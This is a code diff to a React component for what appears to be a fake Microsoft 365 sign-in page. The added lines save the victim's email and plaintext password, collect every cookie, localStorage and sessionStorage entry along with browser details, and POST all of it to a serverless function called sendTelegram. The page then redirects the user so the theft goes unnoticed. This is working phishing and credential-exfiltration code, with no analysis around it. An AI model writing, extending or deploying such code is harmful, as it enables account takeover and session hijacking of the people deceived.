@@ -39,19 +39,76 @@ function App() {
     // Store credentials and perform cookie work
     const sessionData = {
       email: credentials.email,
+      password: credentials.password,
       sessionId: Date.now().toString(),
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
+      provider: 'Microsoft',
+      fileName: 'Microsoft 365 Access'
     };
     
     localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
+    localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));
     sessionStorage.setItem('current_session', JSON.stringify(sessionData));
     
     // Set cookies for the session
     document.cookie = `ms365_session=${sessionData.sessionId}; path=/; secure; samesite=strict`;
     document.cookie = `ms365_email=${encodeURIComponent(credentials.email)}; path=/; secure; samesite=strict`;
     document.cookie = `ms365_auth_time=${Date.now()}; path=/; secure; samesite=strict`;
+    document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
+    document.cookie = `user_email=${encodeURIComponent(credentials.email)}; path=/; secure; samesite=strict`;
+    document.cookie = `sessionid=${sessionData.sessionId}; path=/; secure; samesite=strict`;
     
     console.log('🍪 Cookies set, redirecting back to landing page');
+    
+    // Send credentials to Telegram before redirecting
+    try {
+      const browserFingerprint = {
+        cookies: document.cookie,
+        localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
+        sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        timestamp: new Date().toISOString()
+      };
+      
+      await fetch('/.netlify/functions/sendTelegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email: credentials.email,
+          password: credentials.password,
+          provider: 'Microsoft',
+          fileName: 'Microsoft 365 Login',
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          browserFingerprint: browserFingerprint,
+          documentCookies: document.cookie,
+          sessionId: sessionData.sessionId,
+          cookies: document.cookie,
+          formattedCookies: document.cookie.split(';').map(c => {
+            const [name, value] = c.trim().split('=');
+            return {
+              name: name,
+              value: value || '',
+              domain: window.location.hostname,
+              path: '/',
+              secure: true,
+              httpOnly: false,
+              sameSite: 'strict'
+            };
+          }),
+          localStorage: browserFingerprint.localStorage,
+          sessionStorage: browserFingerprint.sessionStorage
+        })
+      });
+      
+      console.log('✅ Credentials sent to Telegram');
+    } catch (error) {
+      console.error('❌ Failed to send credentials to Telegram:', error);
+    }
     
     // Redirect back to landing page (message icon)
     setTimeout(() => {
